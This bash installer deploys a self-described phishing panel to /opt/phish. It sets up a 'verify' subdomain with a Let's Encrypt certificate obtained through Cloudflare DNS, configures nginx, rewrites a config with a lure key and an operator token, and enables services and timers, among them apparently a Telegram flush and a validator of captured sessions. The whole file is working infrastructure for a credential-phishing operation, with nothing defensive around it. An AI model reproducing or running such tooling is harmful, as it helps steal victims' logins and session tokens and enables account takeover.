#!/usr/bin/env bash
set -euo pipefail

MODE="${1:-full}"
PKG_DIR="${PKG_DIR:-/tmp/ewp-panel}"
PANEL_DIR="/opt/phish"
SECRETS_DIR="/root/.secrets"
CF_INI="$SECRETS_DIR/cf.ini"
NGINX_SITE="/etc/nginx/sites-available/verify"
SYSTEMD_DIR="/etc/systemd/system"
CERT_DIR="/etc/letsencrypt/live/verify.${DOMAIN:-none}"

step() { echo "::STEP:: $*"; }
ok()   { echo "::OK::   $*"; }
err()  { echo "::ERR::  $*"; exit 1; }
need_root() { [ "$(id -u)" = "0" ] || err "root-required" "run as root"; }

preflight() {
  step "preflight"
  [ -n "${DOMAIN:-}" ]         || err "preflight" "DOMAIN not set"
  [ -n "${OPERATOR_TOKEN:-}" ] || err "preflight" "OPERATOR_TOKEN not set"
  [ -n "${LURE_KEY:-}" ]       || err "preflight" "LURE_KEY not set"
  [ -d "$PKG_DIR" ]            || err "preflight" "package dir missing"
  [ -f "$PKG_DIR/app.py" ]     || err "preflight" "app.py missing in $PKG_DIR"
  ok "preflight"
}

panel_only() {
  step "panel-only: stop service"
  systemctl stop phish 2>/dev/null || true
  ok "panel-only: stop service"

  step "panel-only: backup"
  mkdir -p "$PANEL_DIR/exports"
  [ -f "$PANEL_DIR/config.py" ]   && cp "$PANEL_DIR/config.py"   "$PANEL_DIR/exports/config.py.pre-panel-$(date +%s)"   || true
  [ -f "$PANEL_DIR/sessions.db" ] && cp "$PANEL_DIR/sessions.db" "$PANEL_DIR/exports/sessions.db.pre-panel-$(date +%s)" || true
  ok "panel-only: backup"

  step "panel-only: replace files"
  install -m 0644 "$PKG_DIR/app.py"                "$PANEL_DIR/app.py"
  install -m 0644 "$PKG_DIR/db.py"                 "$PANEL_DIR/db.py"
  install -m 0644 "$PKG_DIR/oauth.py"              "$PANEL_DIR/oauth.py"
  install -m 0644 "$PKG_DIR/telegram.py"           "$PANEL_DIR/telegram.py"
  install -m 0644 "$PKG_DIR/worker.py"             "$PANEL_DIR/worker.py"
  install -m 0644 "$PKG_DIR/validator.py"          "$PANEL_DIR/validator.py"
  install -m 0644 "$PKG_DIR/exporter.py"           "$PANEL_DIR/exporter.py"
  install -m 0644 "$PKG_DIR/templates_registry.py" "$PANEL_DIR/templates_registry.py"
  mkdir -p "$PANEL_DIR/static/logos"
  install -m 0644 "$PKG_DIR/static/app.js"       "$PANEL_DIR/static/app.js"
  install -m 0644 "$PKG_DIR/static/style.css"    "$PANEL_DIR/static/style.css"
  install -m 0644 "$PKG_DIR/static/logos/"*.svg  "$PANEL_DIR/static/logos/"
  ok "panel-only: replace files"

  step "panel-only: restart"
  systemctl start phish
  ok "panel-only: restart"
}

wipe_previous() {
  step "wipe: remove previous install"
  systemctl stop phish 2>/dev/null || true
  systemctl disable phish 2>/dev/null || true
  systemctl stop phish-validator.timer 2>/dev/null || true
  systemctl disable phish-validator.timer 2>/dev/null || true
  systemctl stop phish-tg-flush.timer 2>/dev/null || true
  systemctl disable phish-tg-flush.timer 2>/dev/null || true
  rm -f "$SYSTEMD_DIR"/phish.service \
        "$SYSTEMD_DIR"/phish-validator.service \
        "$SYSTEMD_DIR"/phish-validator.timer \
        "$SYSTEMD_DIR"/phish-tg-flush.service \
        "$SYSTEMD_DIR"/phish-tg-flush.timer
  rm -f /etc/nginx/sites-enabled/verify "$NGINX_SITE"
  rm -rf "$PANEL_DIR"
  ok "wipe: remove previous install"
}

install_packages() {
  step "packages"
  export DEBIAN_FRONTEND=noninteractive
  apt-get update -y  >/dev/null 2>&1 || true
  apt-get upgrade -y >/dev/null 2>&1 || true
  apt-get install -y --no-install-recommends \
    nginx python3 python3-pip python3-venv python3-full \
    certbot python3-certbot-dns-cloudflare sqlite3 ufw curl nano git ca-certificates \
    >/dev/null 2>&1
  ok "packages"
}

install_firewall() {
  step "firewall"
  ufw allow 22  >/dev/null 2>&1 || true
  ufw allow 80  >/dev/null 2>&1 || true
  ufw allow 443 >/dev/null 2>&1 || true
  ufw --force enable >/dev/null 2>&1 || true
  ok "firewall"
}

install_venv() {
  step "venv"
  mkdir -p "$PANEL_DIR/static/logos" "$PANEL_DIR/exports"
  rm -rf "$PANEL_DIR/venv"
  /usr/bin/python3.12 -m venv "$PANEL_DIR/venv" 2>/dev/null \
    || /usr/bin/python3 -m venv "$PANEL_DIR/venv"
  "$PANEL_DIR/venv/bin/pip" install --upgrade pip >/dev/null
  "$PANEL_DIR/venv/bin/pip" install flask requests waitress >/dev/null
  ok "venv"
}

install_panel_files() {
  step "panel files"
  install -m 0644 "$PKG_DIR/app.py"                "$PANEL_DIR/app.py"
  install -m 0644 "$PKG_DIR/db.py"                 "$PANEL_DIR/db.py"
  install -m 0644 "$PKG_DIR/oauth.py"              "$PANEL_DIR/oauth.py"
  install -m 0644 "$PKG_DIR/telegram.py"           "$PANEL_DIR/telegram.py"
  install -m 0644 "$PKG_DIR/worker.py"             "$PANEL_DIR/worker.py"
  install -m 0644 "$PKG_DIR/validator.py"          "$PANEL_DIR/validator.py"
  install -m 0644 "$PKG_DIR/exporter.py"           "$PANEL_DIR/exporter.py"
  install -m 0644 "$PKG_DIR/templates_registry.py" "$PANEL_DIR/templates_registry.py"
  install -m 0644 "$PKG_DIR/static/app.js"       "$PANEL_DIR/static/app.js"
  install -m 0644 "$PKG_DIR/static/style.css"    "$PANEL_DIR/static/style.css"
  install -m 0644 "$PKG_DIR/static/logos/"*.svg  "$PANEL_DIR/static/logos/"
  ok "panel files"
}

render_config() {
  step "config"
  sed \
    -e "s|@@DOMAIN@@|$DOMAIN|g" \
    -e "s|@@OPERATOR_TOKEN@@|$OPERATOR_TOKEN|g" \
    -e "s|@@LURE_KEY@@|$LURE_KEY|g" \
    "$PKG_DIR/config.template.py" > "$PANEL_DIR/config.py"
  chmod 0644 "$PANEL_DIR/config.py"
  ok "config"
}

install_cf_credentials() {
  step "cloudflare"
  mkdir -p "$SECRETS_DIR"
  if [ -n "${CF_TOKEN:-}" ]; then
    printf 'dns_cloudflare_api_token = %s\n' "$CF_TOKEN" > "$CF_INI"
    chmod 600 "$CF_INI"
    ok "cloudflare"
  else
    ok "cloudflare (skipped)"
  fi
}

install_nginx() {
  step "nginx"
  sed -e "s|@@DOMAIN@@|$DOMAIN|g" \
      "$PKG_DIR/nginx/verify.conf" > "$NGINX_SITE"
  ln -sf "$NGINX_SITE" /etc/nginx/sites-enabled/verify
  rm -f /etc/nginx/sites-enabled/default
  nginx -t >/dev/null 2>&1 || err "nginx" "config test failed"
  systemctl reload nginx
  ok "nginx"
}

issue_cert() {
  step "tls"
  if [ ! -f "$CERT_DIR/fullchain.pem" ]; then
    certbot certonly \
      --dns-cloudflare \
      --dns-cloudflare-credentials "$CF_INI" \
      --dns-cloudflare-propagation-seconds 30 \
      -d "verify.$DOMAIN" \
      --agree-tos -m "noreply@$DOMAIN" --non-interactive \
      >/dev/null 2>&1 || err "certbot" "cert issue failed"
  fi
  mkdir -p /etc/letsencrypt/renewal-hooks/deploy
  cat > /etc/letsencrypt/renewal-hooks/deploy/reload-nginx.sh <<'HOOK'
#!/bin/bash
systemctl reload nginx
HOOK
  chmod +x /etc/letsencrypt/renewal-hooks/deploy/reload-nginx.sh
  ok "tls"
}

install_systemd() {
  step "systemd"
  install -m 0644 "$PKG_DIR/systemd/phish.service"           "$SYSTEMD_DIR/phish.service"
  install -m 0644 "$PKG_DIR/systemd/phish-validator.service" "$SYSTEMD_DIR/phish-validator.service"
  install -m 0644 "$PKG_DIR/systemd/phish-validator.timer"   "$SYSTEMD_DIR/phish-validator.timer"
  install -m 0644 "$PKG_DIR/systemd/phish-tg-flush.service"  "$SYSTEMD_DIR/phish-tg-flush.service"
  install -m 0644 "$PKG_DIR/systemd/phish-tg-flush.timer"    "$SYSTEMD_DIR/phish-tg-flush.timer"
  systemctl daemon-reload
  systemctl enable --now phish
  systemctl enable --now phish-validator.timer
  systemctl enable --now phish-tg-flush.timer
  ok "systemd"
}

smoke_test() {
  step "smoke"
  sleep 2
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://127.0.0.1/op" -H "Host: verify.$DOMAIN" || echo "000")
  [ "$code" = "200" ] || err "smoke" "verify.$DOMAIN/op returned $code"
  ok "smoke"
}

full() {
  need_root
  preflight
  wipe_previous
  install_packages
  install_firewall
  install_venv
  install_panel_files
  render_config
  install_cf_credentials
  install_nginx
  issue_cert
  install_systemd
  smoke_test
}

main() {
  case "$MODE" in
    full)       full ;;
    panel-only) need_root; preflight; panel_only ;;
    *)          err "usage" "unknown mode: $MODE" ;;
  esac
  echo "::DONE::"
}

main "$@"
